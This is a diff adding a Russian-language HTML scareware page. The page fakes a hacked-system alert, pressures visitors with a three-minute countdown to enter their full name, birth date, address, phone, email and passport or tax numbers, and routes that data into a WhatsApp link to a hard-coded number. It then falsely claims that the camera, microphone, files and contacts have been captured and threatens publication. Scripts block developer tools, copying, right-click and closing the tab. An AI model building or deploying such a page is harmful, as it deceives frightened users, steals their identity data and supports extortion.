@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>⚠ SYSTEM LOCKED ⚠</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    background: #000;
+    color: #f00;
+    font-family: 'Courier New', monospace;
+    margin: 0;
+    padding: 0;
+    min-height: 100vh;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    user-select: none;
+    -webkit-user-select: none;
+  }
+
+  #overlay {
+    position: fixed;
+    inset: 0;
+    pointer-events: none;
+    background: repeating-linear-gradient(
+      0deg,
+      rgba(255,0,0,0.04) 0px,
+      rgba(255,0,0,0.04) 1px,
+      transparent 1px,
+      transparent 3px
+    );
+    z-index: 999;
+  }
+
+  #loading { text-align: center; }
+  #loading h1 {
+    font-size: 28px;
+    letter-spacing: 6px;
+    text-shadow: 0 0 20px #f00;
+    animation: flicker 0.15s infinite alternate;
+  }
+  #loading p {
+    color: #ff0;
+    font-size: 13px;
+    letter-spacing: 3px;
+    margin-top: 15px;
+  }
+  @keyframes flicker {
+    0%   { opacity: 1; }
+    100% { opacity: 0.8; }
+  }
+
+  #form-box {
+    display: none;
+    width: 100%;
+    max-width: 480px;
+    max-height: 95vh;
+    overflow-y: auto;
+    padding: 25px;
+    border: 2px solid #f00;
+    background: rgba(255,0,0,0.05);
+    box-shadow: 0 0 40px #f00;
+    text-align: center;
+  }
+  #form-box h2 {
+    color: #f00;
+    font-size: 18px;
+    letter-spacing: 3px;
+    text-shadow: 0 0 15px #f00;
+    margin: 0 0 10px;
+    animation: flicker 0.2s infinite alternate;
+  }
+  #form-box .timer {
+    color: #ff0;
+    font-size: 38px;
+    font-weight: bold;
+    letter-spacing: 4px;
+    text-shadow: 0 0 20px #ff0;
+    margin: 10px 0 20px;
+    animation: blink 1s step-end infinite;
+  }
+  @keyframes blink { 50% { opacity: 0.4; } }
+
+  #form-box label {
+    display: block;
+    text-align: left;
+    color: #0ff;
+    font-size: 12px;
+    letter-spacing: 1px;
+    margin: 10px 0 4px;
+  }
+  #form-box input, #form-box textarea {
+    width: 100%;
+    background: #000;
+    border: 1px solid #f00;
+    color: #0f0;
+    padding: 10px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    outline: none;
+  }
+  #form-box input:focus, #form-box textarea:focus {
+    box-shadow: 0 0 10px #f00;
+  }
+
+  /* КНОПКА С БЛОКИРОВКОЙ */
+  #form-box button {
+    width: 100%;
+    margin-top: 20px;
+    padding: 15px;
+    background: #333;
+    color: #666;
+    border: 1px solid #f00;
+    font-family: 'Courier New', monospace;
+    font-weight: bold;
+    font-size: 16px;
+    letter-spacing: 2px;
+    cursor: not-allowed;
+    transition: 0.2s;
+  }
+  #form-box button.active {
+    background: #f00;
+    color: #000;
+    cursor: pointer;
+    box-shadow: 0 0 25px #f00;
+  }
+  #form-box button.active:hover {
+    background: #ff0;
+    box-shadow: 0 0 25px #ff0;
+  }
+
+  #final {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.96);
+    z-index: 1000;
+    padding: 30px 20px;
+    overflow-y: auto;
+    text-align: center;
+  }
+  #final h2 {
+    color: #f00;
+    font-size: 24px;
+    letter-spacing: 4px;
+    text-shadow: 0 0 20px #f00;
+    margin-top: 30px;
+    animation: flicker 0.1s infinite alternate;
+  }
+  #final .info {
+    max-width: 520px;
+    margin: 25px auto;
+    border: 1px solid #f00;
+    background: rgba(255,0,0,0.06);
+    padding: 20px;
+    box-shadow: 0 0 25px #f00;
+    font-size: 13px;
+    color: #0f0;
+    line-height: 1.8;
+    text-align: left;
+  }
+  #final .info b { color: #f00; }
+
+  #final .pay {
+    max-width: 520px;
+    margin: 20px auto;
+    border: 2px dashed #ff0;
+    background: rgba(255,255,0,0.06);
+    padding: 20px;
+    box-shadow: 0 0 25px #ff0;
+  }
+  #final .pay h3 {
+    color: #ff0;
+    margin: 0 0 12px;
+    letter-spacing: 2px;
+    text-shadow: 0 0 10px #ff0;
+  }
+  #final .pay p {
+    color: #0f0;
+    margin: 6px 0;
+    font-size: 14px;
+  }
+
+  .wa {
+    display: inline-block;
+    margin-top: 15px;
+    padding: 16px 38px;
+    background: #25D366;
+    color: #000;
+    font-weight: bold;
+    text-decoration: none;
+    border-radius: 8px;
+    font-size: 17px;
+    letter-spacing: 1px;
+    box-shadow: 0 0 25px #25D366;
+    animation: pulse 1.2s infinite;
+  }
+  .wa:hover {
+    background: #1ebe5a;
+    box-shadow: 0 0 45px #25D366;
+  }
+  @keyframes pulse {
+    0%   { transform: scale(1);    box-shadow: 0 0 25px #25D366; }
+    50%  { transform: scale(1.05); box-shadow: 0 0 45px #25D366; }
+    100% { transform: scale(1);    box-shadow: 0 0 25px #25D366; }
+  }
+  .blink { animation: blink 0.8s step-end infinite; }
+
+  /* БЛОКИРОВКА ТАЙМЕРА ПРИ ИСТЕЧЕНИИ */
+  #expired {
+    display: none;
+    color: #f00;
+    font-size: 18px;
+    letter-spacing: 2px;
+    margin-top: 20px;
+    text-shadow: 0 0 15px #f00;
+    animation: blink 0.8s step-end infinite;
+  }
+</style>
+</head>
+<body>
+
+<div id="overlay"></div>
+
+<div id="loading">
+  <h1>⚠ ВЗЛОМ ⚠</h1>
+  <p>ПОПЫТКА НЕСАНКЦИОНИРОВАННОГО ДОСТУПА...</p>
+</div>
+
+<div id="form-box">
+  <h2>◤ ДОСТУП ПОЛУЧЕН ◢</h2>
+  <div class="timer" id="timer">03:00</div>
+
+  <label>ФИО</label>
+  <input id="fio" placeholder="Иванов Иван Иванович">
+
+  <label>Дата рождения</label>
+  <input id="birth" placeholder="01.01.1990">
+
+  <label>Телефон</label>
+  <input id="phone" placeholder="+7 900 000-00-00">
+
+  <label>Адрес</label>
+  <input id="address" placeholder="город, улица, дом, квартира">
+
+  <label>Email</label>
+  <input id="email" placeholder="mail@example.com">
+
+  <label>Дополнительно</label>
+  <textarea id="extra" rows="3" placeholder="паспорт, ИНН, СНИЛС и т.д."></textarea>
+
+  <button id="submitBtn" disabled onclick="sendData()">ЗАПОЛНИТЕ ВСЕ ПОЛЯ</button>
+  <div id="expired">ВРЕМЯ ИСТЕКЛО. ДАННЫЕ УТЕРЯНЫ.</div>
+</div>
+
+<div id="final">
+  <h2 class="blink">◤ ДАННЫЕ ЗАХВАЧЕНЫ ◢</h2>
+
+  <div class="info">
+    <b>Статус:</b> данные получены<br>
+    <b>IP:</b> определён<br>
+    <b>Геолокация:</b> установлена<br>
+    <b>Устройство:</b> идентифицировано<br>
+    <b>Камера:</b> доступ подтверждён<br>
+    <b>Микрофон:</b> доступ подтверждён<br>
+    <b>Файлы:</b> скопированы<br>
+    <b>Контакты:</b> выгружены<br>
+    <b>Публикация:</b> отложена на 24 часа
+  </div>
+
+  <div class="pay">
+    <h3>◉ СВЯЖИТЕСЬ НЕМЕДЛЕННО ◉</h3>
+    <p>Иначе данные будут опубликованы.</p>
+    <a class="wa" id="waBtn" href="#" target="_blank">
+      WhatsApp: +7 927 333-83-50
+    </a>
+  </div>
+</div>
+
+<audio id="bgm" src="https://www.image2url.com/r2/default/audio/1790753912278-89b5e174-a9d1-48a4-b77b-cd61451f553c.mp3" preload="auto"></audio>
+
+<script>
+// ==== НАСТРОЙКА ====
+const YOUR_WHATSAPP = "79273338350"; // замени на точный номер
+// ===================
+
+// 1 сек загрузки → форма
+setTimeout(() => {
+  document.getElementById('loading').style.display = 'none';
+  document.getElementById('form-box').style.display = 'block';
+  document.body.animate(
+    [{transform:'translate(0,0)'},
+     {transform:'translate(4px,-3px)'},
+     {transform:'translate(-4px,3px)'},
+     {transform:'translate(0,0)'}],
+    {duration: 300, iterations: 2}
+  );
+}, 1000);
+
+// === ПРОВЕРКА ВСЕХ ПОЛЕЙ ===
+const fields = ['fio','birth','phone','address','email','extra'];
+const btn = document.getElementById('submitBtn');
+
+function checkFields() {
+  const allFilled = fields.every(id => document.getElementById(id).value.trim().length > 0);
+  if (allFilled) {
+    btn.disabled = false;
+    btn.classList.add('active');
+    btn.textContent = 'ОТПРАВИТЬ';
+  } else {
+    btn.disabled = true;
+    btn.classList.remove('active');
+    btn.textContent = 'ЗАПОЛНИТЕ ВСЕ ПОЛЯ';
+  }
+}
+fields.forEach(id => {
+  document.getElementById(id).addEventListener('input', checkFields);
+});
+
+// === ТАЙМЕР 3 МИНУТЫ ===
+let timeLeft = 180;
+const timerEl = document.getElementById('timer');
+const interval = setInterval(() => {
+  timeLeft--;
+  const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+  const s = String(timeLeft % 60).padStart(2, '0');
+  timerEl.textContent = `${m}:${s}`;
+  if (timeLeft <= 0) {
+    clearInterval(interval);
+    // блокируем всё
+    fields.forEach(id => document.getElementById(id).disabled = true);
+    btn.disabled = true;
+    btn.classList.remove('active');
+    btn.textContent = 'ВРЕМЯ ИСТЕКЛО';
+    document.getElementById('expired').style.display = 'block';
+  }
+}, 1000);
+
+// === ОТПРАВКА ===
+function sendData() {
+  const data = {
+    "ФИО":        document.getElementById('fio').value,
+    "Дата рожд.": document.getElementById('birth').value,
+    "Телефон":    document.getElementById('phone').value,
+    "Адрес":      document.getElementById('address').value,
+    "Email":      document.getElementById('email').value,
+    "Доп.":       document.getElementById('extra').value,
+  };
+
+  let msg = "🔓 НОВЫЕ ДАННЫЕ\n\n";
+  for (const k in data) if (data[k]) msg += `${k}: ${data[k]}\n`;
+
+  const waLink = `https://wa.me/${YOUR_WHATSAPP}?text=${encodeURIComponent(msg)}`;
+  document.getElementById('waBtn').href = waLink;
+
+  document.getElementById('form-box').style.display = 'none';
+
+  const audio = document.getElementById('bgm');
+  audio.volume = 1.0;
+  audio.play().catch(()=>{});
+
+  setTimeout(() => {
+    document.getElementById('final').style.display = 'block';
+  }, 3000);
+}
+
+// === ЗАЩИТА ОТ ПРОПУСКА ===
+
+// 1. Предупреждение при закрытии вкладки
+window.addEventListener('beforeunload', (e) => {
+  if (document.getElementById('final').style.display !== 'block') {
+    e.preventDefault();
+    e.returnValue = 'Вы уверены? Данные не будут отправлены.';
+    return e.returnValue;
+  }
+});
+
+// 2. Блокировка правой кнопки мыши
+document.addEventListener('contextmenu', e => e.preventDefault());
+
+// 3. Блокировка F12, Ctrl+Shift+I, Ctrl+U
+document.addEventListener('keydown', e => {
+  if (
+    e.key === 'F12' ||
+    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+    (e.ctrlKey && e.key === 'u')
+  ) {
+    e.preventDefault();
+  }
+});
+
+// 4. Блокировка выделения и копирования
+document.addEventListener('copy', e => e.preventDefault());
+document.addEventListener('cut', e => e.preventDefault());
+</script>
+</body>
+</html>
